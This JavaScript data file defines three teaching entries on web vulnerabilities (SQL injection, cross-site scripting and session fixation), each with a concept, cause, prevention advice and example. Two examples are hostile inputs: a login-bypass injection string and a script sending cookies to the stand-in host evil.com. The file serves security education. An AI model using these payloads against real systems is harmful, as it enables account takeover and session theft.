export const vulnerabilities = [
  {
    id: 'sqli',
    name: 'SQL Injection',
    concept: 'SQL Injection occurs when an attacker inserts malicious SQL code into input fields (like login forms or search boxes). The application passes this input directly to the database without sanitization, allowing the attacker to read, modify, or delete data.',
    why: 'This happens when developers concatenate user input directly into SQL queries instead of using parameterized queries or prepared statements. Legacy code and lack of input validation are common causes.',
    prevent: 'Use parameterized queries (prepared statements), implement input validation and sanitization, apply the principle of least privilege for database accounts, and use an ORM framework that handles escaping automatically.',
    example: "Input: admin' OR '1'='1' --\nResult: Bypasses authentication by making the WHERE clause always true.",
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    concept: 'XSS attacks inject malicious scripts into web pages viewed by other users. When a victim\'s browser executes the script, the attacker can steal cookies, session tokens, or redirect users to phishing sites.',
    why: 'Applications that display user-generated content without encoding output are vulnerable. Comment sections, search result pages, and profile fields are common XSS entry points.',
    prevent: 'Encode all user output (HTML entity encoding), implement Content Security Policy (CSP) headers, use HTTP-only and Secure flags on cookies, and validate/sanitize all input on both client and server side.',
    example: 'Input: <script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>\nResult: Steals victim session cookies when the page renders.',
  },
  {
    id: 'broken-auth',
    name: 'Broken Authentication',
    concept: 'Broken authentication vulnerabilities allow attackers to compromise passwords, session tokens, or exploit session management flaws to impersonate legitimate users and gain unauthorized access.',
    why: 'Weak password policies, predictable session IDs, missing MFA, session tokens in URLs, and improper logout mechanisms create authentication weaknesses that attackers exploit.',
    prevent: 'Implement multi-factor authentication (MFA), enforce strong password policies, use secure session management with random tokens, set appropriate session timeouts, and protect against credential stuffing with rate limiting.',
    example: 'Attack: Session fixation — attacker sets a known session ID, tricks victim into logging in, then hijacks the authenticated session.',
  },
]
